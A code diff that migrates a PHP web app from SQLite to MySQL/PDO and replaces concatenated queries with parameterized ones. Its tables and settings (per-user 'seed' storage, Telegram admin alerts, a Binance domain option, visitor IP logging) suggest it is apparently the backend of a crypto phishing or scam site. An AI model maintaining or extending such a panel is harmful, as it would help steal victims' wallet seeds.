@@ -10,49 +10,100 @@ if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
 }
 $timestamp = time();
 
-require_once 'settings/db_connect.php';
+// Load environment variables for database connection
+$db_host = getenv('DB_HOST');
+$db_user = getenv('DB_USER');
+$db_pass = getenv('DB_PASS');
+$db_name = getenv('DB_NAME');
 
-$rootPath = $_SERVER['DOCUMENT_ROOT'];
-$filePath = str_replace($rootPath, '', __DIR__);
-$dir = $_SERVER['DOCUMENT_ROOT'] . $filePath . "/db_cryptostudio";
-$db = new SQLite3($dir."/db" . $id_db . ".db");
-$dbB = new SQLite3($dir."/db" . $id_db_balance . ".db");
-$dbV = new SQLite3($dir."/db" . $id_db_visit . ".db");
-/*
-$dir = __DIR__;
-$id_db = "_228";
-$id_db_balance = "B_228";
-$db = new SQLite3($dir."/db" . $id_db . ".db");
-$dbB = new SQLite3($dir."/db" . $id_db_balance . ".db");
-*/
-//$dbV->query("CREATE TABLE IF NOT EXISTS visitors (id INTEGER PRIMARY KEY, ip TEXT, timestamp INTEGER)");
+// Connect to MySQL using PDO
+try {
+    // Main database connection (replacing $db)
+    $dsn = "mysql:host=$db_host;dbname=$db_name;charset=utf8mb4";
+    $db = new PDO($dsn, $db_user, $db_pass);
+    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-if ($stmt = $db->prepare('SELECT * FROM settings WHERE id=1')) {
-    $result = $stmt->execute();
-    $USER_S = $result->fetchArray(SQLITE3_ASSOC);
+    // We'll use the same database for balance and visits, but with different tables
+    $dbB = $db; // Balance database (same connection, different table)
+    $dbV = $db; // Visits database (same connection, different table)
+} catch (PDOException $e) {
+    die("Database connection failed: " . $e->getMessage());
 }
+
+// Create tables if they don't exist (equivalent to SQLite schema)
+// For $db (main database)
+$db->exec("CREATE TABLE IF NOT EXISTS settings (
+    id INTEGER PRIMARY KEY AUTO_INCREMENT,
+    tg_admin TEXT,
+    tg_bot TEXT,
+    ts TEXT,
+    domain_cur TEXT
+)");
+
+$db->exec("CREATE TABLE IF NOT EXISTS users (
+    id INTEGER PRIMARY KEY AUTO_INCREMENT,
+    uuid TEXT,
+    -- Add other columns as needed based on your app's schema
+    email TEXT
+)");
+
+$db->exec("CREATE TABLE IF NOT EXISTS promo_actived (
+    id INTEGER PRIMARY KEY AUTO_INCREMENT,
+    user TEXT,
+    promo TEXT
+)");
+
+// For $dbB (balance database)
+$dbB->exec("CREATE TABLE IF NOT EXISTS balances (
+    id INTEGER PRIMARY KEY AUTO_INCREMENT,
+    -- Add columns based on your balance schema
+    user_id TEXT,
+    balance TEXT
+)");
+
+// For $dbV (visits database)
+$dbV->exec("CREATE TABLE IF NOT EXISTS visitors (
+    id INTEGER PRIMARY KEY AUTO_INCREMENT,
+    ip TEXT,
+    timestamp INTEGER
+)");
+
+$dbV->exec("CREATE TABLE IF NOT EXISTS users_seed (
+    id INTEGER PRIMARY KEY AUTO_INCREMENT,
+    uuid TEXT,
+    -- Add other columns as needed
+    seed TEXT
+)");
+
+$dbV->exec("CREATE TABLE IF NOT EXISTS settings_json (
+    id INTEGER PRIMARY KEY AUTO_INCREMENT,
+    balance TEXT
+)");
+
+// Fetch settings (equivalent to SQLite query)
+$stmt = $db->prepare('SELECT * FROM settings WHERE id=1');
+$stmt->execute();
+$USER_S = $stmt->fetch(PDO::FETCH_ASSOC);
 
 $chat_id = $USER_S['tg_admin'];
 $bot_token = $USER_S['tg_bot'];
 $ts_id = $USER_S['ts'];
 
+if (isset($_SESSION['uuid'])) {
+    // Fetch user data
+    $stmt = $db->prepare('SELECT * FROM users WHERE uuid = :uuid');
+    $stmt->execute(['uuid' => $_SESSION['uuid']]);
+    $USER = $stmt->fetch(PDO::FETCH_ASSOC);
 
+    // Fetch user seed data
+    $stmt = $dbV->prepare('SELECT * FROM users_seed WHERE uuid = :uuid');
+    $stmt->execute(['uuid' => $_SESSION['uuid']]);
+    $USER_SEED = $stmt->fetch(PDO::FETCH_ASSOC);
 
-if(isset($_SESSION['uuid'])) {
-    if ($stmt = $db->prepare('SELECT * FROM users WHERE uuid="' . $_SESSION['uuid'] . '"')) {
-        $result = $stmt->execute();
-        $USER = $result->fetchArray(SQLITE3_ASSOC);
-    }
-
-    if ($stmt = $dbV->prepare('SELECT * FROM users_seed WHERE uuid="' . $_SESSION['uuid'] . '"')) {
-        $result = $stmt->execute();
-        $USER_SEED = $result->fetchArray(SQLITE3_ASSOC);
-    }
-
-    if ($stmt = $db->prepare('SELECT * FROM promo_actived WHERE user="' . $_SESSION['uuid'] . '"')) {
-        $result = $stmt->execute();
-        $USER_PROMO = $result->fetchArray(SQLITE3_ASSOC);
-    }
+    // Fetch promo data
+    $stmt = $db->prepare('SELECT * FROM promo_actived WHERE user = :user');
+    $stmt->execute(['user' => $_SESSION['uuid']]);
+    $USER_PROMO = $stmt->fetch(PDO::FETCH_ASSOC);
 
     if (!isset($USER_PROMO['promo'])) {
         $USER_PROMO['promo'] = "Не введен";
@@ -81,13 +132,10 @@ function getAgent(){
 
 function getDepTokensBalance(){
     global $dbV;
-    if ($stmt = $dbV->prepare('SELECT * FROM settings_json WHERE id="1"')) {
-        $result = $stmt->execute();
-        while ($arr = $result->fetchArray(SQLITE3_ASSOC)) {
-            $json_file = $arr['balance'];
-        }
-    }
-    return $json_file;
+    $stmt = $dbV->prepare('SELECT * FROM settings_json WHERE id = :id');
+    $stmt->execute(['id' => 1]);
+    $arr = $stmt->fetch(PDO::FETCH_ASSOC);
+    return $arr['balance'];
 }
 
 function sendTelegramMessage($chat_id, $message, $bot_token)
@@ -140,12 +188,10 @@ function getSettings($type, $db){
         $t = true;
         $type = 'domain_cur';
     }
-    if ($stmt = $db->prepare('SELECT * FROM settings WHERE id=1')) {
-        $result = $stmt->execute();
-        while ($arr = $result->fetchArray(SQLITE3_ASSOC)) {
-            $get_info = $arr[$type];
-        }
-    }
+    $stmt = $db->prepare('SELECT * FROM settings WHERE id=1');
+    $stmt->execute();
+    $arr = $stmt->fetch(PDO::FETCH_ASSOC);
+    $get_info = $arr[$type];
 
     if($t){
         if(($get_info == 'binance.us') or ($get_info == 'binance.com')){
